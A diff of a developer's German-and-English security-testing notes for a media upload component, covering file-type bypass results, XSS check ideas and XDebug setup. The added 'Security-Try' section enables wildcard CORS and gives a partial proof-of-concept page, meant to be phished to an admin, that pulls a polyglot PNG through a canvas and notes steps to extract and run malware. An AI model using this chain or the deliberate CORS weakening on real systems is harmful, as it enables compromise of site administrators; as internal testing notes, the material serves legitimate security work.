@@ -30,6 +30,12 @@ Freitag:
 	d.h. Bypass Content-Type & magic number funktioniert in gewissen masse, aber bringt nicht viel, ausser das die datein im /images folder liegen und mehr oder weniger kautte .png bzw. .gif sind.
 	* Datei extensions evaluiert. Alle Formate machen soweit sinn. Doc dateien könnten macros enthalten, sind aber auch ausreichen gekapselt.
 	
+Montag:
+	* MediaHelper XSS Check sinnvoll gestalten
+	* Ideen:
+		* HTML Sanitze Check, damit html datein hochgeladen werden können
+		* SVG ist ontop of html und damit noch schwieriger/unsicherer
+
 
 ### XDebug 3 Config with lampp stack inside container running on WSL and PHPStorm
 
@@ -64,3 +70,42 @@ PHPStorm
 
 just make sure the path mapping are correct. Make sure your local project files map to the project in the container
 
+
+
+#### Security-Try 
+
+Enable Cors with Wildcard, because someone might think its a good thing
+
+HTML/JS which might get called by an admin via email or w/e phishing
+```html
+<html>
+
+<body>
+	<script type="text/javascript">
+		var img = new Image();
+
+		img.crossOrigin = 'anonymous';
+
+		document.body.appendChild(img)
+		// The magic begins after the image is successfully loaded
+		img.onload = function () {
+			var canvas = document.createElement('canvas'),
+				ctx = canvas.getContext('2d');
+
+			canvas.height = img.naturalHeight;
+			canvas.width = img.naturalWidth;
+			ctx.drawImage(img, 0, 0);
+			var uri = canvas.toDataURL('image/png'),
+				b64 = uri.replace(/^data:image.+;base64,/, '');
+
+			console.log(b64); //-> "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWP4z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg=="
+		};
+		img.src = "http://localhost:8080/www/mediahelper_security/images/xss2.png"
+
+		// 1) decode image 
+		// 2) remove magic number bytes
+		// 3) exectue malware :))
+	</script>
+</body>
+</html>
+```
